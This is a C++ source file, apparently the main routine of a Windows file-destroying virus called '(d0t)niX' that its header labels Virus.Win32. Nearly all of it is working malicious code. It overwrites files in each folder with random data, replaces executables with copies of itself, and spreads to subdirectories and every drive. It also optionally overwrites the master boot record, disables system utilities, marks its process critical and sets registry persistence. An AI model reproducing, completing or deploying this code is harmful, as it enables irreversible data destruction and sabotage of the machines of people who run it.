/*-----------------------------------------------------+-------------------------------------\
 |    ___    __________   __  ___          ______  ___ |  ____            ______  ___  ____  |
 |   /  / __| _/\   _  \_/  |_\  \   ____ |__\   \/  / | |   _|     ____ |__\   \/  / |_   | |
 |  /  / / __ | /  /_\  \   __\\  \ /    \|  |\     /  | |  |      /    \|  |\     /    |  | |
 | (  ( / /_/ | \  \_/   \  |   )  )   |  \  |/     \  | |  |     |   |  \  |/     \    |  | |
 |  \  \\____ |  \_____  /__|  /  /|___|  /__/___/\  \ | |  |_  /\|___|  /__/___/\  \  _|  | |
 |   \__\    \/        \/     /__/      \/         \_/ | |____| \/     \/         \_/ |____| |
 +-----------------------------------------------------+------------+------------------------/
 | (d0t)niX [.niX] your File Killa]       [Virus.Win32.VC Type: C2] |
 | by Lima X [L4X] / [G-C-E-R] © 2kl9     [dev-VER: 0.5.2 BETA-2.0] |
 \------------------------------------------------------------------*/

#include "../Header-Files/pch.h"
#include "../Header-Files/(d0t)niX.h"

INT APIENTRY wWinMain(
	_In_     HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_     LPWSTR    lpCmdLine,
	_In_     INT       nShowCmd
) {
	// Read Commandline Arguments
	INT nArgs;
	LPWSTR* szArglist = CommandLineToArgvW(GetCommandLine(), &nArgs);

	// Check if ArgumentList was Created, if not: Exit Malware
	if (!szArglist) {
		fnMESSAGEHANDLERW(NULL, L"Couldn't parse Commandline", L"CommandLineToArgvW", MB_ICONERROR);
		ExitProcess(EXIT_FAILURE);
	}

	// Save current Directory and FileName to Buffers
	GetCurrentDirectory(MAX_PATH, szCd);
	GetModuleFileName(NULL, szMfn, MAX_PATH);

	if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/exec"))) { //// Start of /exec //// Malware Payload execution /////////////////////////////////////
#if DEBUG_MSG == TRUE
		MessageBox(NULL, L"Executing with Argument: /exec", szMALWR_NAME, MB_ICONINFORMATION | MB_SYSTEMMODAL);
#endif // DEBUG_MSG

		// Check if /host Mutex exists, if not: Exit Malware
		if (!fnCheckMutexW(szHOST_MUTEX)) {
			LocalFree(szArglist);
			ExitProcess(EXIT_FAILURE);
		}

		std::vector<std::wstring> vszDir, vszFile;
		if (fnDirectoryIteratorW(szCd, L"*", &vszDir, &vszFile)) {
			// FileCorruptor //
			LARGE_INTEGER liFs;
			PWCHAR pszRd;
			DWORD dwNOBW;
			NTSTATUS lBCGRr;
			for (std::wstring i : vszFile) {
				HANDLE hFile = CreateFile(i.c_str(), GENERIC_ALL, NULL, NULL, OPEN_EXISTING, 0, NULL);
				if (hFile) {
					if (!lstrcmp(PathFindExtension(i.c_str()), L".exe")) {
						if (lstrcmp(i.c_str(), szMfn)) {
							if (SetFileAttributes(i.c_str(), FILE_ATTRIBUTE_NORMAL)) {
								if (!CopyFile(szMfn, i.c_str(), FALSE)) {
									fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
										MB_ICONERROR, szMfn, i.c_str());
								}
							} else {
								fnMESSAGEHANDLERW(NULL, L"Couldn't set File Attribute", L"SetFileAttributesW", MB_ICONERROR);
							}
						}
					} else if (GetFileSizeEx(hFile, &liFs)) {
						if ((liFs.QuadPart < nMAX_BUFFER_SIZE + 1) && (liFs.HighPart == 0)) {
							pszRd = new WCHAR[liFs.LowPart];
						} else {
							pszRd = new WCHAR[nMAX_BUFFER_SIZE];
							liFs.LowPart = nMAX_BUFFER_SIZE;
						}

						if (pszRd) {
							lBCGRr = BCryptGenRandom(NULL, (LPBYTE)pszRd, liFs.LowPart, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
							if (lBCGRr) {
								fnMESSAGEHANDLERW(NULL, L"Couldn't generate Random Buffer Content\nusing ZeroMemory instead", L"BCryptGenRandom",
									MB_ICONWARNING);
								ZeroMemory(pszRd, liFs.LowPart);
							}
							if (!WriteFile(hFile, pszRd, liFs.LowPart, &dwNOBW, NULL)) {
								fnMESSAGEHANDLERW(NULL, L"Couldn't overwrite FileData", L"WriteFile", MB_ICONERROR);
							}

							delete[] pszRd;
						} else {
							fnMESSAGEHANDLERW(NULL, L"Couldn't allocate Buffer", L"new(malloc(HeapAlloc))", MB_ICONERROR);
						}
					}

					CloseHandle(hFile);
				} else {
					fnMESSAGEHANDLERW(NULL, L"Couldn't open existing File\n File: %s", L"CreateFileW", MB_ICONERROR, i.c_str());
				}
			}

			// DirectoryInfector //
			std::wstring szNfn;
			for (std::wstring i : vszDir) {
				szNfn = i + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
				} else {
					fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
						MB_ICONERROR, szMfn, szNfn.c_str());
				}
			}
		}

		LocalFree(szArglist);
		ExitProcess(EXIT_SUCCESS);
//// End of /exec ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	} else if ((nArgs > 1) && (!lstrcmp(szArglist[1], L"/host"))) { //// Start of /host //// Malware Host with/without Malware initialization ///////
#if DEBUG_MSG == TRUE
		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) {
			MessageBox(NULL, L"Executing with Argument: /init\nInitializing Malware", szMALWR_NAME, MB_ICONINFORMATION | MB_SYSTEMMODAL);
		} else {
			MessageBox(NULL, L"Executing with Argument: /host\nLaunching MalwareHost", szMALWR_NAME, MB_ICONINFORMATION | MB_SYSTEMMODAL);
		}
#endif // DEBUG_MSG

		if (!fnIsUserAdmin()) {
			fnMESSAGEHANDLERW(NULL, L"Process isn't Administrator", L"fnIsUserAdmin", MB_ICONERROR);
			LocalFree(szArglist);
			ExitProcess(EXIT_FAILURE);
		}
		if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
			fnMESSAGEHANDLERW(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_ICONWARNING);
		}

#if SYNCHRONIZATION == TRUE
		// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
		if (fnCheckMutexW(szHOST_MUTEX)) {
			fnMESSAGEHANDLERW(NULL, L"Malware Host is already running\n(Mutex already exist)", L"fnCheckMutexW", MB_ICONINFORMATION);

			LocalFree(szArglist);
			ExitProcess(EXIT_FAILURE);
		} else {
			// Create /host Mutex for /exec operation
			HANDLE hMutex = CreateMutex(NULL, TRUE, szHOST_MUTEX);
			if (!hMutex) {
				fnMESSAGEHANDLERW(NULL, L"Couldn't create /host Mutex", L"CreateMutexW", MB_ICONERROR);
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}
		}
#endif // SYNCHRONIZATION

#if NT_FUNCTIONS == TRUE
		// Set Process as critical
		if (fnNTSetProcessIsCritical(TRUE)) {
			MessageBox(NULL, L"HostProcess is now Critical", szMALWR_NAME, MB_ICONWARNING | MB_SYSTEMMODAL);
		}
#endif // NT_FUNCTIONS

		// Initialize the Malware
		if ((nArgs > 2) && (!lstrcmp(szArglist[2], L"/init"))) { //// Start of /init //// Malware initialization ////////////////////////////////////
#if KILL_MBR == TRUE
			fnOverwriteMBR();
#endif // KILL_MBR
#if PROTECTIONS == TRUE
			fnDisableUtilities();
#endif // PROTECTIONS

			// Enumerate Drives
			std::vector<std::wstring> vszDrives;
			std::wstring szNfn;
			if (fnDriveEnumeratorW(&vszDrives)) {
				// Copy & Execute Malware in all enumerated Drives
				for (std::wstring i : vszDrives) {
					szNfn = i + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";

					if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
						ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", i.c_str(), SW_SHOWDEFAULT);
					} else {
						fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
							MB_ICONERROR, szMfn, szNfn.c_str());
					}
				}
			} else {
				// If DriveEnumerator fails, try C:\ Directory
				szNfn = L"C:\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";

				if (CopyFile(szMfn, szNfn.c_str(), FALSE)) {
					ShellExecute(NULL, L"runas", szNfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
				} else {
					fnMESSAGEHANDLERW(NULL, L"Couldn't copy current Module to target Path\nModule: %s\nTarget: %s", L"CopyFileW",
						MB_ICONERROR, szMfn, szNfn.c_str());
				}
			}

			// Create Registry Key
			if (!fnCreateRegistryKeyW(HKEY_LOCAL_MACHINE, szREGISTRY_KEY, TRUE, NULL, NULL, NULL)) {
				fnCreateRegistryKeyW(HKEY_CURRENT_USER, szREGISTRY_KEY, TRUE, NULL, NULL, NULL);
			}
		} //// End of /init /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

		// Deadlock
		LocalFree(szArglist);
		Sleep(INFINITE);
	} //// End of /host /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	// Create Random String to Copy host into AppData if necessary
	PWSTR pszShkfp;
	SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pszShkfp);
	std::wstring szAdpn = (std::wstring)pszShkfp + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN));
	std::wstring szAdfn = szAdpn + L"\\" + fnCryptGenRandomStringW(nRNG_RAN(nMIN_RS_LEN, nMAX_RS_LEN)) + L".exe";
	CoTaskMemFree(pszShkfp);

	// Check Registry Key/Type/Value
	if (fnCheckRegistryKeyW(szREGISTRY_KEY)) {
		if (!fnIsUserAdmin()) {
			ShellExecute(NULL, L"runas", szMfn, NULL, NULL, SW_SHOWDEFAULT);

			LocalFree(szArglist);
			ExitProcess(EXIT_FAILURE);
		}

		if (!fnCheckMutexW(szHOST_MUTEX)) {
			if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
				ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host", NULL, SW_SHOWDEFAULT);
			} else {
				LocalFree(szArglist);
				ExitProcess(EXIT_FAILURE);
			}
		}

		for (INT i = 0; i < 50; i++) {
			if (fnCheckMutexW(szHOST_MUTEX)) {
				ShellExecute(NULL, L"runas", szMfn, L"/exec", NULL, SW_SHOWDEFAULT);
				break;
			} else {
				if (i == (50 - 1)) {
					fnMESSAGEHANDLERW(NULL, L"Malware Host failed to launch", L"fnCheckMutexW", MB_ICONERROR);
					LocalFree(szArglist);
					ExitProcess(EXIT_FAILURE);
				}

				Sleep(100);
			}
		}
	} else {
#if WARNING == TRUE
		// Warn User about the execution of the Malware
		HANDLE hHeap = GetProcessHeap();
		if (!hHeap) {
			MessageBox(NULL, L"Couldn't get Handle to Process Heap", L"fnMessageHandlerW (GetProcessHeap)", MB_ICONERROR | MB_SYSTEMMODAL);
			ExitProcess(EXIT_FAILURE);
		}
		std::wstring szRCheck = fnCryptGenRandomStringW(0x8);
		SIZE_T ulHeap = ((lstrlen(lpszWarningMSG) * 2) + (lstrlen(szRCheck.c_str()) * 2));

		LPVOID lpMessage = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, ulHeap);
		if (lpMessage) {
			if (SUCCEEDED(StringCbPrintf((LPWSTR)lpMessage, ulHeap, lpszWarningMSG, szRCheck.c_str()))) {
				if (MessageBox(NULL, (LPCWSTR)lpMessage, szMALWR_NAME, MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL) == IDYES) {
					if (CreateFile(szRCheck.c_str(), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL) != INVALID_HANDLE_VALUE) {
						if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str())) {
							ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
							HeapFree(hHeap, NULL, lpMessage);
						}
					} else {
						fnMESSAGEHANDLERW(NULL, L"Couldn't open Check-File", L"CreateFileW", MB_ICONERROR);
					}
				}
			} else {
				fnMESSAGEHANDLERW(NULL, L"Couldn't format Warning-Message", L"StringCbPrintf", MB_ICONERROR);
			}
		} else {
			fnMESSAGEHANDLERW(NULL, L"Couldn't allocate Buffer in Heap", L"HeapAlloc", MB_ICONERROR);
		}

		HeapFree(hHeap, NULL, lpMessage);
#else // WARNING
		if (fnCopyFileW(szAdpn.c_str(), szAdfn.c_str(), szMfn)) {
			ShellExecute(NULL, L"runas", szAdfn.c_str(), L"/host /init", szAdpn.c_str(), SW_SHOWDEFAULT);
		} else {
			LocalFree(szArglist);
			ExitProcess(EXIT_FAILURE);
		}
#endif // !WARNING
	}

	LocalFree(szArglist);
	return EXIT_SUCCESS;
}